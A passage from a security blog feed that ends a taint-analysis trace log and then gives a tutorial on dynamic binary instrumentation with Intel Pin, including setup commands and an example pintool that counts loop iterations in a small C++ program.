<span style="color:#f92672">[</span>READ in 7fffa2866448<span style="color:#f92672">]</span>	7f7b4c49675b: mov rcx, qword ptr <span style="color:#f92672">[</span>rbx+0x8<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866590<span style="color:#f92672">]</span>	7f7b4c4967c0: mov rax, qword ptr <span style="color:#f92672">[</span>r12<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866598<span style="color:#f92672">]</span>	7f7b4c4967c4: mov rcx, qword ptr <span style="color:#f92672">[</span>r12+0x8<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866470<span style="color:#f92672">]</span>	7f7b4c496990: mov rcx, qword ptr <span style="color:#f92672">[</span>rbx+0x30<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866590<span style="color:#f92672">]</span>	7f7b4c496994: mov eax, dword ptr <span style="color:#f92672">[</span>r12<span style="color:#f92672">]</span>
.
.
.
<span style="color:#f92672">[</span>READ in 7fffa2866558<span style="color:#f92672">]</span>	7f7b4c497570: mov edx, dword ptr <span style="color:#f92672">[</span>rbx<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866568<span style="color:#f92672">]</span>	7f7b4c4975a4: mov rdx, qword ptr <span style="color:#f92672">[</span>rbx+0x10<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866580<span style="color:#f92672">]</span>	7f7b4c4975b0: mov rdx, qword ptr <span style="color:#f92672">[</span>rbx+0x28<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866308<span style="color:#f92672">]</span>	7f7b4c497c82: mov rax, qword ptr <span style="color:#f92672">[</span>rdi+0x28<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866320<span style="color:#f92672">]</span>	7f7b4c497c8f: movzx edi, word ptr <span style="color:#f92672">[</span>rdi+0x40<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>WRITE in 7fffa2866620<span style="color:#f92672">]</span>	7f7b4c49921c: push rbp
<span style="color:#f92672">[</span>WRITE in 7fffa2866618<span style="color:#f92672">]</span>	7f7b4c49921d: push rbx
<span style="color:#f92672">[</span>TAINT<span style="color:#f92672">]</span>			bytes tainted from 0x7fffa28662c8 to 0x7fffa2866608 <span style="color:#f92672">(</span>via read<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>READ in 7fffa28662d0<span style="color:#f92672">]</span>	7f7b4c4965f4: movzx edx, byte ptr <span style="color:#f92672">[</span>r15+0x10<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa28662d8<span style="color:#f92672">]</span>	7f7b4c4966bd: movzx edi, word ptr <span style="color:#f92672">[</span>r15+0x18<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866300<span style="color:#f92672">]</span>	7f7b4c4966db: movzx ecx, word ptr <span style="color:#f92672">[</span>r15+0x40<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa2866300<span style="color:#f92672">]</span>	7f7b4c4966db: movzx ecx, word ptr <span style="color:#f92672">[</span>r15+0x40<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa28662e8<span style="color:#f92672">]</span>	7f7b4c4966e0: mov r9, qword ptr <span style="color:#f92672">[</span>r15+0x28<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>READ in 7fffa28662e8<span style="color:#f92672">]</span>	7f7b4c4966e0: mov r9, qword ptr <span style="color:#f92672">[</span>r15+0x28<span style="color:#f92672">]</span>
.
.
.
<span style="color:#f92672">[</span>READ in 7fffa28665c8<span style="color:#f92672">]</span>	7f7b4c49a040: pop r13
<span style="color:#f92672">[</span>READ in 7fffa28665c8<span style="color:#f92672">]</span>	7f7b4c49a040: pop r13
<span style="color:#f92672">[</span>READ in 7fffa28665c8<span style="color:#f92672">]</span>	7f7b4c49a040: pop r13
<span style="color:#f92672">[</span>READ in 7fffa28665d0<span style="color:#f92672">]</span>	7f7b4c49a042: pop r14
<span style="color:#f92672">[</span>READ in 7fffa28665d0<span style="color:#f92672">]</span>	7f7b4c49a042: pop r14
<span style="color:#f92672">[</span>READ in 7fffa28665d0<span style="color:#f92672">]</span>	7f7b4c49a042: pop r14
<span style="color:#f92672">[</span>READ in 7fffa2866d20<span style="color:#f92672">]</span>	7f7b37d714e7: vpcmpeqb ymm1, ymm0, ymmword ptr <span style="color:#f92672">[</span>rdi<span style="color:#f92672">]</span>
</code></pre></div><p>And there we have all the interactions with the tainted area.</p>
<p>Credits for the guidance to NJU&rsquo;s SECLAB &ldquo;Software Security&rdquo; course.</p>
]]></content>
        </item>
        
        <item>
            <title>Dynamic Binary Instrumentation and Pin</title>
            <link>https://hexterisk.github.io/blog/posts/2020/06/03/dynamic-binary-instrumentation-and-pin/</link>
            <pubDate>Wed, 03 Jun 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/06/03/dynamic-binary-instrumentation-and-pin/</guid>
            <description>Dynamic Binary Instrumentation is the process of monitoring or measuring a binary&amp;rsquo;s execution and its behavior, such as resource usage, during runtime. It allows us to focus on specific parts of a binary for various purposes such as vulnerability analysis, dynamic tainting and state analysis.
We will skip over Source Instrumentation since it requires source code of the application, which is pretty rare in real world scenarios.
Instrumentation Code The technique requires injecting Instrumentation Code into a running binary.</description>
            <content type="html"><![CDATA[<p><strong>Dynamic Binary Instrumentation</strong> is the process of monitoring or measuring a binary&rsquo;s execution and its behavior, such as resource usage, during runtime. It allows us to focus on specific parts of a binary for various purposes such as vulnerability analysis, dynamic tainting and state analysis.</p>
<p>We will skip over Source Instrumentation since it requires source code of the application, which is pretty rare in real world scenarios.</p>
<h3 id="instrumentation-code">Instrumentation Code</h3>
<p>The technique requires injecting <strong>Instrumentation Code</strong> into a running binary. DBI Frameworks introduce a layer between the OS and the application, making this injected code completely transparent to the application we inject it in. We simply add hooks to parts of interest. These hooks intercept the instruction execution and transfers control to the instrumentation code, thus we can observe and modify the instructions of the program being instrumented, as it executes.</p>
<h3 id="code-coverage">Code Coverage</h3>
<p>High code coverage will most definitely require running the binary a lot of times. Since different types of input will trigger different paths of the binary, this section could particularly benefit from the help of fuzzers.</p>
<h3 id="granularity">Granularity</h3>
<p>There are different levels at which we can apply instrumentation.</p>
<h5 id="bbl-basic-block">BBL: Basic Block</h5>
<p>Sequence of instructions that is always entered at the top and exited at the bottom by a fall through and/or taken branch. If Pin detects a jump to an instruction in the middle of a bbl, it will create a new bbl beginning at the target.</p>
<h5 id="trace-trace">TRACE: Trace</h5>
<p>Sequence of instructions that is always entered at the top and may have multiple exits. If Pin detects a jump to an instruction in the middle of a trace, it will create a new trace beginning at the target.</p>
<h5 id="img-image-of-the-binary">IMG: Image of the Binary</h5>
<p>Image instrumentation lets the Pintool inspect and instrument an entire image, IMG, when it is first loaded. A Pintool can walk the sections(SEC) of the image, the routines(RTN) of a section, and the instructions(INS) of a routine.</p>
<h3 id="performance">Performance</h3>
<p>The impact/overhead on performance/runtime of the binary is dependent on many factors, but it will most definitely depend on the granularity of instrumentation, as well as the tasks performed by the instrumentation code. The execution will be delayed between each hook, for as long as the instrumentation code does its job.</p>
<h3 id="use-cases">Use cases</h3>
<ul>
<li>Profiling for compiler optimization/performance profiling.
<ul>
<li>Instruction profiling</li>
<li>Basic block count</li>
<li>Value profile</li>
</ul>
</li>
<li>Bug detection/Vulnerability identification/Exploit generation.
<ul>
<li>Find references to uninitialized and unallocated addresses</li>
<li>Inspect arguments at a particular function call</li>
<li>Inspect function pointers and return addresses</li>
<li>Record &amp; replay</li>
</ul>
</li>
<li>Architectural research.
<ul>
<li>Processor and cache simulation</li>
<li>Trace collection</li>
</ul>
</li>
</ul>
<h2 id="pin">Pin</h2>
<p>Pin is an instrumentation engine created by Intel. It comes packed with a JIT for x86 and x86_64.</p>
<p><img src="/Dynamic_Binary_Instrumentation_and_Pin/image.png" alt="&ldquo;arch&rdquo;">
<em>Architecture overview.</em></p>
<p>Visit <a href="https://software.intel.com/sites/landingpage/pintool/docs/81205/Pin/html/index.html">https://software.intel.com/sites/landingpage/pintool/docs/81205/Pin/html/index.html</a> for the documentation.</p>
<p>It allows us to build instrumentation programs, or analysis tools, known as <strong>Pintools</strong>, that register hooks on events in the program.</p>
<ul>
<li><strong>Instrumentation Routines</strong> are called only on the first time when something happens.</li>
<li><strong>Analysis Routines</strong> are called every time this object is reached.</li>
<li><strong>Callbacks</strong> are called whenever a certain event happens.</li>
</ul>
<p>Pin has two modes:</p>
<h5 id="jit-mode">JIT Mode</h5>
<ul>
<li>Pin creates a modified copy of the application on-the-fly.</li>
<li>Original code never executes. The only code ever executed is the generated code.</li>
<li>The original code is only used for reference.</li>
<li>When generating code, Pin gives the user an opportunity to inject their own code (instrumentation).</li>
</ul>
<h5 id="probe-mode">Probe Mode</h5>
<ul>
<li>A method of using Pin to wrap or replace application functions with functions in the tool.</li>
<li>A jump instruction (probe), which redirects the flow of control to the replacement function is placed at the start of the specified function.</li>
<li>The bytes being overwritten are relocated, so that Pin can provide the replacement function with the address of the first relocated byte. This enables the replacement function to call the replaced (original) function.</li>
<li>Probes can only be placed on RTN boundaries.</li>
</ul>
<h3 id="setup">Setup</h3>
<ul>
<li>Visit <a href="https://software.intel.com/content/www/us/en/develop/articles/pin-a-binary-instrumentation-tool-downloads.html">https://software.intel.com/content/www/us/en/develop/articles/pin-a-binary-instrumentation-tool-downloads.html</a> and download the package that suits your OS and CPU architecture.
<ul>
<li>I&rsquo;m on a linux machine running x86-64.</li>
<li>The command I used: <code>wget https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.13-98189-g60a6ef199-gcc-linux.tar.gz  -P /tmp/</code></li>
<li>Using Pin 3.13(Kit 98189) in June 2020.</li>
</ul>
</li>
<li>Untar the gzip into a folder named <code>pin-dir</code>.
<ul>
<li>Command Format: <code>mkdir pin-dir &amp;&amp; tar -zxvf PIN_GZIP -C pin-dir --strip-components=1</code>, where PIN_GZIP is the name of the downloaded gzip.</li>
<li>The command I used: <code>mkdir pin-dir &amp;&amp; tar -zxvf pin-3.13-98189-g60a6ef199-gcc-linux.tar.gz -C pin-dir --strip-components=1</code></li>
</ul>
</li>
<li>Move the tool folder to <code>/opt</code>.
<ul>
<li>Command: <code>sudo mv /tmp/pin-dir /opt/</code></li>
</ul>
</li>
<li>Navigate inside the folder and compile all source files.
<ul>
<li>Find your CPU architecture by running <code>lscpu</code>.
<ul>
<li>if it is 64-bit, command: <code>cd /opt/pin-dir/source/tools &amp;&amp; make all</code></li>
<li>If it is 32-bit, command: <code>cd /opt/pin-dir/source/tools &amp;&amp; make all TARGET=ia32</code></li>
</ul>
</li>
</ul>
</li>
<li>Setup complete.</li>
</ul>
<p>Compiled <a href="https://github.com/hexterisk/scripts/blob/master/install-Pin.sh">script</a> can be downloaded from here.</p>
<h3 id="execution">Execution</h3>
<p>Format: <code>./pin -t [full path to tool] -- [full path to app]</code></p>
<p>The tools are made into shared libraries so that they can be loaded anywhere in the memory space of the Pined process at runtime, since dynamic binary instrumentation requires instrumentation code to be injected into the process at runtime.</p>
<p>NOTE for Windows: </p>
<ul>
<li><em>.so</em> is the extension for shared objects in Linux, so if you&rsquo;re working on windows, swap it with <em>.dll</em> wherever you encounter it in the guide.</li>
<li><em>/opt/pin-dir</em> would be replaced with whatever directory the Pin zipfile from Intel&rsquo;s site is extracted in.</li>
<li>Visit <a href="https://rayanfam.com/topics/build-a-simple-pin-tool/">https://rayanfam.com/topics/build-a-simple-pin-tool/</a> for a more comprehensive guide.</li>
</ul>
<p>To execute a pre-made pintool (modify folder and path suffixes based on CPU architecture),</p>
<ul>
<li>Command: <code>./pin -t /opt/pin-dir/source/tools/ManualExamples/obj-intel64/PIN_TOOL.so – BINARY_PATH</code>, where PIN_TOOL is the tool to be used and BINARY_PATH is the path to the bianry to be isntrumented.</li>
<li>Output can be found in the default file: <code>/opt/pin-dir/PIN_TOOL.out</code>, where PIN_TOOL is the name of the pintool executed.</li>
</ul>
<p>For example, if I want to run the <strong>inscount0</strong> pintool on a binary named <strong>calc</strong> located in my home folder, I would execute the command <code>./pin -t /opt/pin-dir/source/tools/ManualExamples/obj-intel64/inscount0.so – ~/calc</code>, and read the output by executing <code>cat /opt/pin-dir/inscount0.out</code>.</p>
<p>To make your own pintool, let&rsquo;s setup a working directory first.</p>
<ul>
<li>
<p>Make an empty directory inside the tools folder.</p>
<ul>
<li>Command: <code>/opt/pin-dir/source/tools/CUSTOM_DIR</code>, where CUSTOM_DIR is the name of the custom working directory.</li>
<li>Copy <code>makefile</code>, command: <code>cp /opt/pin-dir/source/tool/ManualExamples/makefile /opt/pin-dir/source/tool/CUSTOM_DIR/</code>.</li>
<li>Copy <code>makefile.rules</code>, command: <code>cp /opt/pin-dir/source/tool/ManualExamples/makefile.rules /opt/pin-dir/source/tool/CUSTOM_DIR/</code>.</li>
<li>Edit <code>makefile.rules</code>.
<ul>
<li>There&rsquo;s a line beginning with the words <code>TEST_TOOL_ROOTS :=</code>, clear out all the names in front of the <code>:=</code>. Put the name of your tool in front of it later on to build it.</li>
<li>Comment the last two lines. They are:</li>
</ul>
</li>
</ul>
<p>$(OBJDIR)divide_by_zero$(EXE_SUFFIX): divide_by_zero_$(OS_TYPE).c#
$(APP_CC) $(APP_CXXFLAGS_NOOPT) $(COMP_EXE) $(APP_LDFLAGS_NOOPT) $(APP_LIBS)</p>
</li>
</ul>
<p>Now we can build the tool.</p>
<ul>
<li>Write the tool&rsquo;s source code inside <code>CUSTOM_DIR</code>, say it&rsquo;s name be <code>CUSTOM_TOOL.CPP</code>.</li>
<li>Add the name of the tool, namely <code>CUSTOM_TOOL</code>, in the <code>makefile.rules</code> as stipulated above.</li>
<li>Execute the command: <code>make obj-intel64/CUSTOM_TOOL.so</code></li>
<li>Now you can run this custom pintool just as a pre-made one, mind the change of directory.
<ul>
<li>Command: <code>./pin -t /opt/pin-dir/source/tools/CUSTOM_DIR/obj-intel64/CUSTOM_TOOL.so -- BINARY_PATH</code></li>
</ul>
</li>
</ul>
<p>Visit the documentation&rsquo;s main page and see under the heading ”Pin&rsquo;s makefile Infrastructure&rdquo; for a more comprehensive guide.</p>
<h3 id="debugging">Debugging</h3>
<p>Pintools can be debugged using the <code>-pause_tool</code> switch, followed by the number of seconds to wait until the debugger is attached to its process.</p>
<h3 id="example">Example</h3>
<p>We&rsquo;ll create a simple C++ program to instrument. </p>
<p>Since instruction counting is a cliché now, we&rsquo;ll do something different. Let&rsquo;s find loops and predict their number of iterations. It&rsquo;s a rudimentary approach full of loop holes, but works for naïve programs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// loop.cpp
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
using namespace std;

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">looper0</span>(<span style="color:#66d9ef">int</span> low, <span style="color:#66d9ef">int</span> high) {
    <span style="color:#66d9ef">int</span> i, sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> low; i <span style="color:#f92672">&lt;</span> high; i<span style="color:#f92672">++</span>)
        sum <span style="color:#f92672">+=</span> i;
    <span style="color:#66d9ef">return</span> sum;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">looper1</span>(<span style="color:#66d9ef">int</span> low, <span style="color:#66d9ef">int</span> high) {
    <span style="color:#66d9ef">int</span> i, sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> low; i <span style="color:#f92672">&lt;</span> high; i<span style="color:#f92672">++</span>)
        sum <span style="color:#f92672">+=</span> i;
    <span style="color:#66d9ef">return</span> sum;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
    <span style="color:#66d9ef">int</span> sum;
    
    sum <span style="color:#f92672">=</span> looper0(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">250</span>);
    sum <span style="color:#f92672">+=</span> looper1(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">250</span>);
    sum <span style="color:#f92672">+=</span> looper0(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">250</span>);
    
    std<span style="color:#f92672">::</span>cout<span style="color:#f92672">&lt;&lt;</span>sum<span style="color:#f92672">&lt;&lt;</span>endl;
    
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Compile the file by executing <code>g++ loop.cpp -o loop</code>.</p>
<p>All the program does is call two functions with a loop each, at different types. So based on the source code, loop inside <code>looper0</code> should run 500times while the one in <code>looper1</code> should run 250 times.</p>
<p>Let&rsquo;s write a pintool to predict the loops.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// loopcount.cpp
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fstream&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unordered_map&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iterator&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pin.H&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
using std<span style="color:#f92672">::</span>cerr;
using std<span style="color:#f92672">::</span>endl;
using std<span style="color:#f92672">::</span>ios;
using std<span style="color:#f92672">::</span>string;

<span style="color:#75715e">// Map to track loops
</span><span style="color:#75715e"></span>std<span style="color:#f92672">::</span>unordered_map<span style="color:#f92672">&lt;</span>ADDRINT, <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> u;

<span style="color:#75715e">// Main Binary Image
</span><span style="color:#75715e"></span>IMG MainBinary;

<span style="color:#75715e">// Checks if the instruction comes from the binary being instrumented.
</span><span style="color:#75715e"></span>BOOL <span style="color:#a6e22e">CheckBounds</span>(ADDRINT addr) {
    <span style="color:#66d9ef">if</span>(addr <span style="color:#f92672">&lt;</span> IMG_HighAddress(MainBinary) <span style="color:#f92672">&amp;&amp;</span> addr <span style="color:#f92672">&gt;</span> IMG_LowAddress(MainBinary)){
        <span style="color:#66d9ef">return</span> true;
    }
    <span style="color:#66d9ef">return</span> false;
}

VOID <span style="color:#a6e22e">Analyse</span>(ADDRINT addr, BOOL taken){
    
    <span style="color:#66d9ef">if</span>(CheckBounds(addr)) {

        <span style="color:#75715e">// If the branch is not taken, then it follows the fall through, that is, reiteration.
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>taken) {
            <span style="color:#66d9ef">if</span> (u.find(addr) <span style="color:#f92672">==</span> u.end()){
                u.insert({addr, <span style="color:#ae81ff">1</span>});
            }
            <span style="color:#66d9ef">else</span>{
                <span style="color:#f92672">++</span>u[addr];
            }
        }
    }
}

VOID <span style="color:#a6e22e">Instruction</span>(INS ins, VOID<span style="color:#f92672">*</span> v)
{	
    <span style="color:#66d9ef">if</span>(INS_IsBranch(ins) <span style="color:#f92672">&amp;&amp;</span> INS_HasFallThrough(ins)){
        <span style="color:#75715e">// std::cout &lt;&lt; &#34;[+] Condition Branch encountered: &#34;&lt;&lt;INS_Disassemble(ins)&lt;&lt;endl;
</span><span style="color:#75715e"></span>        INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)Analyse, IARG_INST_PTR, IARG_BRANCH_TAKEN, IARG_END);
    }
}

VOID <span style="color:#a6e22e">Image</span>(IMG img, VOID<span style="color:#f92672">*</span> v)
{
    <span style="color:#66d9ef">if</span>(IMG_IsMainExecutable(img)){
        MainBinary <span style="color:#f92672">=</span> img;

        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[*] Main Binary Image: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> IMG_Name(img) <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Image limits 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>hex <span style="color:#f92672">&lt;&lt;</span> IMG_LowAddress(img) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34; - 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> IMG_HighAddress(img) <span style="color:#f92672">&lt;&lt;</span> endl;
    }
    <span style="color:#66d9ef">else</span> {
        std<span style="color:#f92672">::</span>string name <span style="color:#f92672">=</span> IMG_Name(img);
        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[*] Image: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> name <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
    }
}

<span style="color:#75715e">// This function is called when the application exits
</span><span style="color:#75715e"></span>VOID <span style="color:#a6e22e">Fini</span>(INT32 code, VOID <span style="color:#f92672">*</span>v)
{

    <span style="color:#75715e">// Iterate and print keys and values of unordered_map
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span>( <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">auto</span><span style="color:#f92672">&amp;</span> n : u ) {
        <span style="color:#66d9ef">if</span>(n.second <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>) {
            printf(<span style="color:#e6db74">&#34;Loop condition encountered at: 0x%lX</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, n.first);
            printf(<span style="color:#e6db74">&#34;Iterations: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, n.second);
        }
    }
    
    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] End of analysis.&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[])
{
    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Initialising PIN...&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
    PIN_InitSymbols();
    PIN_Init(argc, argv);

    IMG_AddInstrumentFunction(Image, NULL);
    INS_AddInstrumentFunction(Instruction, NULL);

    PIN_AddFiniFunction(Fini, NULL);
    
    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[+] Starting Instrumentation...&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
    PIN_StartProgram();
    
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>A bunch of methods and API calls need to be taken a look at.</p>
<p>The main function, <code>main</code>, is responsible to get Pin ready and started.</p>
<ul>
<li><code>PIN_InitSymbols</code>:
<ul>
<li>Initializes the symbol table code. Pin does not read symbols unless this method is called.</li>
</ul>
</li>
<li><code>PIN_Init</code>:
<ul>
<li>Initializes the PIN instrumentation engine. Takes the command line argument specifiers <code>argc</code> and <code>argv</code> as taken by <code>main</code> itself.</li>
</ul>
</li>
<li><code>IMG_AddInstrumentFunction</code>:
<ul>
<li>Registers a callback to be made to the function passed in the parameter whenever a new image(library or a binary) is loaded.</li>
</ul>
</li>
<li><code>INS_AddInstrumentFunction</code>:
<ul>
<li>Adds a function to instrument at instruction level granularity.</li>
</ul>
</li>
<li><code>PIN_AddFiniFunction</code>:
<ul>
<li>Calls the specified function right before the application exits.</li>
<li>Not an instrumentation routine.</li>
<li>More than one can be present.</li>
</ul>
</li>
<li><code>PIN_StartProgram</code>:
<ul>
<li>Starts executing the application, when Pin is in JIT mode(default setting).</li>
</ul>
</li>
</ul>
<p>The image instrumentation function, <code>Image</code>, prints all information about the images that get loaded during the course of execution.</p>
<ul>
<li><code>IMG_IsMainExecutable</code>:
<ul>
<li>Checks if the image is the binary being instrumented.</li>
</ul>
</li>
<li><code>IMG_LowAddress</code>:
<ul>
<li>Fetches the lowest address of any code or data loaded by the image.</li>
</ul>
</li>
<li><code>IMG_HighAddress</code>:
<ul>
<li>Fetches the highest address of any code or data loaded by the image.</li>
<li>Address of the last byte loaded by the image.</li>
</ul>
</li>
<li><code>IMG_Name</code>:
<ul>
<li>Fetches the name of the image.</li>
</ul>
</li>
</ul>
<p>The instrumentation function, <code>Instruction</code>, cycles through all instructions and registers a callback if the instruction is a branching one and has a fall through. This is a defining characteristic of a loop.</p>
<ul>
<li><code>INS_IsBranch</code>:
<ul>
<li>Checks if the instruction is a branch instruction.</li>
</ul>
</li>
<li><code>INS_HasFallThrough</code>:
<ul>
<li>Checks if there is an instruction following the current one to follow a natural flow of execution if the branch is not taken.</li>
</ul>
</li>
<li><code>INS_InsertCall</code>:
<ul>
<li>Inserts a call to the specified function.</li>
<li>First argument is the instruction to be instrumented.</li>
<li>Second argument is the position where the call is to be made, that is, before the instruction, after it or after branching.
<ul>
<li>IPOINT_BEFORE is always valid for all instructions.</li>
<li>IPOINT_AFTER: is valid only when a fall-through exists (i.e. Calls and unconditional branches will fail).</li>
<li>IPOINT_TAKEN_BRANCH: is invalid for non-branches.</li>
</ul>
</li>
<li>Third argument contains the instrumentation code.</li>
<li>The following arguments are the arguments needed by the instrumentation function.</li>
<li>Last argument is always IARG_END.</li>
</ul>
</li>
</ul>
<p>The analysis function, <code>Analyse</code>, creates a map of all functions that we can suspect of being a loop.</p>
<p>The bound checking function, <code>CheckBounds</code>, checks if the instruction address is between the bounds of the lowest and highest address of the main binary in memory, that is, makes sure the instruction being instrumented comes from the binary itself and not from any of the other images loaded.</p>
<p>The finalizing function, <code>Fini</code>, is called right before the binary exits. It iterates through the map and prints all the instructions&rsquo; address along with the number of times they were parsed, if they were parsed more than once. These could be loop conditionals.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// Result of the instrumentation
</span><span style="color:#75715e"></span>
<span style="color:#960050;background-color:#1e0010">$</span> pin <span style="color:#f92672">-</span>t obj<span style="color:#f92672">-</span>intel64<span style="color:#f92672">/</span>loopcount.so <span style="color:#f92672">--</span> <span style="color:#f92672">~/</span>loop
[<span style="color:#f92672">+</span>] Initialising PIN...
[<span style="color:#f92672">+</span>] Starting Instrumentation...

[<span style="color:#f92672">*</span>] Main Binary Image: <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>hexterisk<span style="color:#f92672">/</span>Work<span style="color:#f92672">/</span>pin<span style="color:#f92672">/</span>calc
[<span style="color:#f92672">+</span>] Image limits <span style="color:#ae81ff">0x562fad148000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x562fad14a1bf</span>
[<span style="color:#f92672">*</span>] Image: <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>
[<span style="color:#f92672">*</span>] Image: [vdso]
[<span style="color:#f92672">*</span>] Image: <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libstdc<span style="color:#f92672">++</span>.so<span style="color:#ae81ff">.6</span>
[<span style="color:#f92672">*</span>] Image: <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libm.so<span style="color:#ae81ff">.6</span>
[<span style="color:#f92672">*</span>] Image: <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libgcc_s.so<span style="color:#ae81ff">.1</span>
[<span style="color:#f92672">*</span>] Image: <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
<span style="color:#ae81ff">93375</span>
Loop condition encountered at: <span style="color:#ae81ff">0x562FAD149186</span>
Iterations: <span style="color:#ae81ff">500</span>
Loop condition encountered at: <span style="color:#ae81ff">0x562FAD1491B6</span>
Iterations: <span style="color:#ae81ff">250</span>
[<span style="color:#f92672">+</span>] End of analysis.
</code></pre></div><p>Since ASLR is on, the base address would be different. So we verify the offsets by looking at the disassembly.</p>
<p><img src="/Dynamic_Binary_Instrumentation_and_Pin/2020-06-22-022324-screenshot.png" alt="&ldquo;looper0&rdquo;">
<em>looper0</em></p>
<p>Notice the <code>jge</code> instrunction at the offset 0x1186.</p>
<p><img src="/Dynamic_Binary_Instrumentation_and_Pin/2020-06-22-022329-screenshot.png" alt="&ldquo;looper1&rdquo;">
<em>looper1</em></p>
<p>Notice the <code>jge</code> instruction at the offset 0x11B6.</p>
<p>The offsets are in line with the output we got on the console via our pintool.</p>
